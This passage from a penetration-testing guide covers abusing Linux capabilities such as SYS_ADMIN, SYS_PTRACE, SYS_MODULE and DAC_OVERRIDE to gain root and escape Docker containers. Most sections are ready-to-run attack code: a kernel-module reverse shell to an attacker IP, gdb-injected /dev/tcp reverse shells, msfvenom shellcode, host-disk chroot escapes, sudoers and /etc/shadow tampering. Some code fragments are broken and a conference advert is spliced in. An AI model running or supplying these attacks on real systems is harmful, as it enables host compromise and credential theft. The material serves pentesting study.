Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Inside the previous output you can see that the SYS\_ADMIN capability is enabled.

* **Mount**

This allows the docker container to **mount the host disk and access it freely**:

```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```

* **Full access**

In the previous method we managed to access the docker host disk.\
In case you find that the host is running an **ssh** server, you could **create a user inside the docker host** disk and access it via SSH:

```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```

## CAP\_SYS\_PTRACE

**This means that you can escape the container by injecting a shellcode inside some process running inside the host.** To access processes running inside the host the container needs to be run at least with **`--pid=host`**.

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use `ptrace(2)` and recently introduced cross memory attach system calls such as `process_vm_readv(2)` and `process_vm_writev(2)`. If this capability is granted and the `ptrace(2)` system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53) or the **following PoC**:

**Example with binary (python)**

**Example with binary (gdb)**

`gdb` with `ptrace` capability:

Create a shellcode with msfvenom to inject in memory via gdb

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"

	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Debug a root process with gdb ad copy-paste the previously generated gdb lines:

**Example with environment (Docker breakout) - Another gdb Abuse**

If **GDB** is installed (or you can install it with `apk add gdb` or `apt install gdb` for example) you can **debug a process from the host** and make it call the `system` function. (This technique also requires the capability `SYS_ADMIN`)**.**

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

You won’t be able to see the output of the command executed but it will be executed by that process (so get a rev shell).

If you get the error "No symbol "system" in current context." check the previous example loading a shellcode in a program via gdb.

List **processes** running in the **host** `ps -eaf`

1. Get the **architecture** `uname -m`
2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the process to load and unload arbitrary kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls). This could lead to trivial privilege escalation and ring-0 compromise. The kernel can be modified at will, subverting all system security, Linux Security Modules, and container systems.\
**This means that you can** **insert/remove kernel modules in/from the kernel of the host machine.**

**Example with binary**

In the following example the binary **`python`** has this capability.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

By default, **`modprobe`** command checks for dependency list and map files in the directory **`/lib/modules/$(uname -r)`**.\
In order to abuse this, lets create a fake **lib/modules** folder:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Then **compile the kernel module you can find 2 examples below and copy** it to this folder:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Finally, execute the needed python code to load this kernel module:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Example 2 with binary**

In the following example the binary **`kmod`** has this capability.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Which means that it's possible to use the command **`insmod`** to insert a kernel module. Follow the example below to get a **reverse shell** abusing this privilege.

**Example with environment (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Inside the previous output you can see that the **SYS\_MODULE** capability is enabled.

**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
The blank char before each make word in the Makefile **must be a tab, not spaces**!
{% endhint %}

Execute `make` to compile it.

```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Finally, start `nc` inside a shell and **load the module** from another one and you will capture the shell in the nc process:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**The code of this technique was copied from the laboratory of "Abusing SYS\_MODULE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Another example of this technique can be found in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to **bypass file read, and directory read and execute permissions**. While this was designed to be used for searching or reading files, it also grants the process permission to invoke `open_by_handle_at(2)`. Any process with the capability `CAP_DAC_READ_SEARCH` can use `open_by_handle_at(2)` to gain access to any file, even files outside their mount namespace. The handle passed into `open_by_handle_at(2)` is intended to be an opaque identifier retrieved using `name_to_handle_at(2)`. However, this handle contains sensitive and tamperable information, such as inode numbers. This was first shown to be an issue in Docker containers by Sebastian Krahmer with [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) exploit.\
**This means that you can** **bypass can bypass file read permission checks and directory read/execute permission checks.**

**Example with binary**

The binary will be able to read any file. So, if a file like tar has this capability it will be able to read the shadow file:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Example with binary2**

In this case lets suppose that **`python`** binary has this capability. In order to list root files you could do:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

And in order to read a file you could do:

```python
print(open("/etc/shadow", "r").read())
```

**Example in Environment (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Inside the previous output you can see that the **DAC\_READ\_SEARCH** capability is enabled. As a result, the container can **debug processes**.

You can learn how the following exploiting works in [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP\_DAC\_READ\_SEARCH** not only allows us to traverse the file system without permission checks, but also explicitly removes any checks to _**open\_by\_handle\_at(2)**_ and **could allow our process to sensitive files opened by other processes**.

The original exploit that abuse this permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified version that allows you to indicate the file you want to read as first argument and dump it in a file.**

## CAP\_DAC\_OVERRIDE

**This mean that you can bypass write permission checks on any file, so you can write any file.**

There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Example with binary**

In this example vim has this capability, so you can modify any file like _passwd_, _sudoers_ or _shadow_:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Example with binary 2**

In this example **`python`** binary will have this capability. You could use python to override any file:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Example with environment + CAP\_DAC\_READ\_SEARCH (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep

```

In order to scape the docker container you could **download** the files `/etc/shadow` and `/etc/passwd` from the host, **add** to them a **new user**, and use **`shocker_write`** to overwrite them. Then, **access** via **ssh**.

**The code of this technique was copied from the laboratory of "Abusing DAC\_OVERRIDE Capability" from** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**This means that it's possible to change the ownership of any file.**

**Example with binary**

Lets suppose the **`python`** binary has this capability, you can **change** the **owner** of the **shadow** file, **change root password**, and escalate privileges:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Or with the **`ruby`** binary having this capability:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP\_FOWNER

**This means that it's possible to change the permission of any file.**

**Example with binary**

If python has this capability you can modify the permissions of the shadow file, **change root password**, and escalate privileges:

```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```

### CAP\_SETUID

**This means that it's possible to set the effective user id of the created process.**

**Example with binary**

If python has this **capability**, you can very easily abuse it to escalate privileges to root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Another way:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

## CAP\_SETGID

**This means that it's possible to set the effective group id of the created process.**

There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Example with binary**

In this case you should look for interesting files that a group can read because you can impersonate any group:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Once you have find a file you can abuse (via reading or writing) to escalate privileges you can **get a shell impersonating the interesting group** with:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

In this case the group shadow was impersonated so you can read the file `/etc/shadow`:

```bash
cat /etc/shadow
```

If **docker** is installed you could **impersonate** the **docker group** and abuse it to communicate with the [**docker socket** and escalate privileges](./#writable-docker-socket).

## CAP\_SETFCAP

**This means that it's possible to set capabilities on files and processes**

**Example with binary**

If python has this **capability**, you can very easily abuse it to escalate privileges to root:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```
{% endcode %}

```bash
python setcapability.py /usr/bin/python2.7
```

{% hint style="warning" %}
Note that if you set a new capability to the binary with CAP\_SETFCAP, you will lose this cap.
{% endhint %}

Once you have [SETUID capability](linux-capabilities.md#cap\_setuid) you can go to its section to see how to escalate privileges.

**Example with environment (Docker breakout)**

By default the capability **CAP\_SETFCAP is given to the proccess inside the container in Docker**. You can check that doing something like:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
                                                                                                                     
apsh --decode=00000000a80425fb         
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

This capability allow to **give any other capability to binaries**, so we could think about **escaping** from the container **abusing any of the other capability breakouts** mentioned in this page.\
However, if you try to give for example the capabilities CAP\_SYS\_ADMIN and CAP\_SYS\_PTRACE to the gdb binary, you will find that you can give them, but the **binary won’t be able to execute after this**:

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

After investigating I read this: _Permitted: This is a **limiting superset for the effective capabilities** that the thread may assume. It is also a limiting superset for the capabilities that may be added to the inheri‐table set by a thread that **does not have the CAP\_SETPCAP** capability in its effective set._\
It looks like the Permitted capabilities limit the ones that can be used.\
However, Docker also grants the **CAP\_SETPCAP** by default, so you might be able to **set new capabilities inside the inheritables ones**.\
However, in the documentation of this cap: _CAP\_SETPCAP : \[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\
It looks like we can only add to the inheritable set capabilities from the bounding set. Which means that **we cannot put new capabilities like CAP\_SYS\_ADMIN or CAP\_SYS\_PTRACE in the inherit set to escalate privileges**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) provides a number of sensitive operations including access to `/dev/mem`, `/dev/kmem` or `/proc/kcore`, modify `mmap_min_addr`, access `ioperm(2)` and `iopl(2)` system calls, and various disk commands. The `FIBMAP ioctl(2)` is also enabled via this capability, which has caused issues in the [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). As per the man page, this also allows the holder to descriptively `perform a range of device-specific operations on other devices`.

This can be useful for **privilege escalation** and **Docker breakout.**

## CAP\_KILL

**This means that it's possible to kill any process.**

**Example with binary**

Lets suppose the **`python`** binary has this capability. If you could **also modify some service or socket configuration** (or any configuration file related to a service) file, you could backdoor it, and then kill the process related to that service and wait for the new configuration file to be executed with your backdoor.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc with kill**

If you have kill capabilities and there is a **node program running as root** (or as a different user)you could probably **send** it the **signal SIGUSR1** and make it **open the node debugger** to where you can connect.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**This means that it's possible to listen in any port (even in privileged ones).** You cannot escalate privileges directly with this capability.

**Example with binary**

If **`python`** has this capability it will be able to listen on any port and even connect from it to any other port (some services require connections from specific privileges ports)

{% tabs %}
{% tab title="Listen" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```
{% endtab %}

{% tab title="Connect" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to be able to **create RAW and PACKET socket types** for the available network namespaces. This allows arbitrary packet generation and transmission through the exposed network interfaces. In many cases this interface will be a virtual Ethernet device which may allow for a malicious or **compromised container** to **spoof** **packets** at various network layers. A malicious process or compromised container with this capability may inject into upstream bridge, exploit routing between containers, bypass network access controls, and otherwise tamper with host networking if a firewall is not in place to limit the packet types and contents. Finally, this capability allows the process to bind to any address within the available namespaces. This capability is often retained by privileged containers to allow ping to function by using RAW sockets to create ICMP requests from a container.

**This means that it's possible to sniff traffic.** You cannot escalate privileges directly with this capability.

**Example with binary**

If the binary **`tcpdump`** has this capability you will be able to use it to capture network information.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Note that if the **environment** is giving this capability you could also use **`tcpdump`** to sniff traffic.

**Example with binary 2**

The following example is **`python2`** code that can be useful to intercept traffic of the "**lo**" (**localhost**) interface. The code is from the lab "_The Basics: CAP-NET\_BIND + NET\_RAW_" from [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the capability holder to **modify the exposed network namespaces' firewall, routing tables, socket permissions**, network interface configuration and other related settings on exposed network interfaces. This also provides the ability to **enable promiscuous mode** for the attached network interfaces and potentially sniff across namespaces.

**Example with binary**

Lets suppose that the **python binary** has these capabilities.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP\_LINUX\_IMMUTABLE

**This means that it's possible modify inode attributes.** You cannot escalate privileges directly with this capability.

**Example with binary**

If you find that a file is immutable and python has this capability, you can **remove the immutable attribute and make the file modifiable:**

```python
#Check that the file is imutable
lsattr file.sh 
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```

{% hint style="info" %}
Note that usually this immutable attribute is set and remove using:

```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permits the use of the `chroot(2)` system call. This may allow escaping of any `chroot(2)` environment, using known weaknesses and escapes:

* [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use the `reboot(2)` syscall. It also allows for executing an arbitrary **reboot command** via `LINUX_REBOOT_CMD_RESTART2`, implemented for some specific hardware platforms.

This capability also permits use of the `kexec_load(2)` system call, which loads a new crash kernel and as of Linux 3.17, the `kexec_file_load(2)` which also will load signed kernels.

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) was finally forked in Linux 2.6.37 from the `CAP_SYS_ADMIN` catchall, this capability allows the process to use the `syslog(2)` system call. This also allows the process to view kernel addresses exposed via `/proc` and other interfaces when `/proc/sys/kernel/kptr_restrict` is set to 1.

The `kptr_restrict` sysctl setting was introduced in 2.6.38, and determines if kernel addresses are exposed. This defaults to zero (exposing kernel addresses) since 2.6.39 within the vanilla kernel, although many distributions correctly set the value to 1 (hide from everyone accept uid 0) or 2 (always hide).

In addition, this capability also allows the process to view `dmesg` output, if the `dmesg_restrict` setting is 1. Finally, the `CAP_SYS_ADMIN` capability is still permitted to perform `syslog` operations itself for historical reasons.

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows an extended usage of [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) by permitting creation of something other than a regular file (`S_IFREG`), FIFO (named pipe)(`S_IFIFO`), or UNIX domain socket (`S_IFSOCK`). The special files are:

* `S_IFCHR` (Character special file (a device like a terminal))
* `S_IFBLK` (Block special file (a device like a disk)).

It is a default capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

This capability permits to do privilege escalations (through full disk read) on the host, under these conditions:

1. Have initial access to the host (Unprivileged).
2. Have initial access to the container (Privileged (EUID 0), and effective `CAP_MKNOD`).
3. Host and container should share the same user namespace.

**Steps :**

1. On the host, as a standard user:
   1. Get the current UID (`id`). For example: `uid=1000(unprivileged)`.
   2. Get the device you want to read. For exemple: `/dev/sda`
2. On the container, as `root`:

```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```

1. Back on the host:

```bash
# Find the PID linked to the container owns by the user "unprivileged"
# Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```

The attacker can now read, dump, copy the device /dev/sda from unprivileged user.

### CAP\_SETPCAP

**`CAP_SETPCAP`** is a Linux capability that allows a process to **modify the capability sets of another process**. It grants the ability to add or remove capabilities from the effective, inheritable, and permitted capability sets of other processes. However, there are certain restrictions on how this capability can be used.

A process with `CAP_SETPCAP` **can only grant or remove capabilities that are in its own permitted capability set**. In other words, a process cannot grant a capability to another process if it does not have that capability itself. This restriction prevents a process from elevating the privileges of another process beyond its own level of privilege.

Moreover, in recent kernel versions, the `CAP_SETPCAP` capability has been **further restricted**. It no longer allows a process to arbitrarily modify the capability sets of other processes. Instead, it **only allows a process to lower the capabilities in its own permitted capability set or the permitted capability set of its descendants**. This change was introduced to reduce potential security risks associated with the capability.

To use `CAP_SETPCAP` effectively, you need to have the capability in your effective capability set and the target capabilities in your permitted capability set. You can then use the `capset()` system call to modify the capability sets of other processes.

In summary, `CAP_SETPCAP` allows a process to modify the capability sets of other processes, but it cannot grant capabilities that it doesn't have itself. Additionally, due to security concerns, its functionality has been limited in recent kernel versions to only allow reducing capabilities in its own permitted capability set or the permitted capability sets of its descendants.

Introduction
Capabilities in Linux are special attributes that can be allocated to processes, binaries, services and users and they can allow them specific privileges that are normally reserved for root-level actions, such as being able to intercept network traffic or mount/unmount file systems. If misconfigured, these could allow an attacker to elevate their privileges to root.

Capabilities List
Below is a handy list of capabilities that are available on Linux, and a brief description:

Capability	Description
CAP_AUDIT_CONTROL	Allow to enable/disable kernel auditing
CAP_AUDIT_WRITE	Helps to write records to kernel auditing log
CAP_BLOCK_SUSPEND	This feature can block system suspends
CAP_CHOWN	Allow user to make arbitrary change to files UIDs and GIDs (full filesystem access)
CAP_DAC_OVERRIDE	This helps to bypass file read, write and execute permission checks (full filesystem access)
CAP_DAC_READ_SEARCH	This only bypass file and directory read/execute permission checks
CAP_FOWNER	This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file
CAP_KILL	Allow the sending of signals to processes belonging to others
CAP_SETGID	Allow changing of the UID (set UID of root in you process)
CAP_SETPCAP	Helps to transferring and removal of current set to any PID
CAP_IPC_LOCK	This helps to lock memory
CAP_MAC_ADMIN	Allow MAC configuration or state changes
CAP_NET_RAW	Use RAW and PACKET sockets (sniff traffic)
CAP_NET_BIND_SERVICE	SERVICE Bind a socket to internet domain privileged ports
CAP_SYS_CHROOT	Ability to call chroot()
CAP_SYS_ADMIN	Mount/Unmount filesystems
CAP_SYS_PTRACE	Debug processes (inject shellcodes)
CAP_SYS_MODULE	Insert kernel modules
CAP_FSETID	Do not clear set-user-ID and set-group-ID mode bits when a file is modified
CAP_LINUX_IMMUTABLE	Set the FS_APPEND_FL and FS_IMMUTABLE_FL inode flags (see ioctl_iflags(2))
CAP_NET_BROADCAST	Make socket broadcasts, and listen to multicasts
CAP_NET_ADMIN	Perform various network-related operations such as interface configuration, administration of IP firewall, modify routing tables etc.
CAP_IPC_OWNER	Bypass permission checks for operations on System V IPC objects
CAP_SYS_RAWIO	Perform I/O port operations (iopl(2) and ioperm(2))
CAP_SYS_PACCT	Enables or disables process accounting
CAP_SYS_BOOT	call reboots the system, or enables/disables the reboot keystroke
CAP_SYS_NICE	Lower the process nice value (nice(2), setpriority(2)) and change the nice value for arbitrary processes; set scheduling policies, CPU affinity, I/O scheduling and priority for processes, allow to migrate processes to arbitrary nodes
CAP_SYS_RESOURCE	Use reserved space on ext2 filesystems, make ioctl(2) calls, override resource disk quote limits, maximum number of consoles and maximum number of keymaps, /proc/sys/fs/pipe-size-max limit, /proc/sys/fs/mqueue/queues_max, /proc/sys/fs/mqueue/msg_max, and /proc/sys/fs/mqueue/msgsize_max limits allow more than 64hz interrupts from the real-time clock, and more
CAP_SYS_TIME	Set system clock (settimeofday(2), stime(2), adjtimex(2)); set real-time (hardware) clock
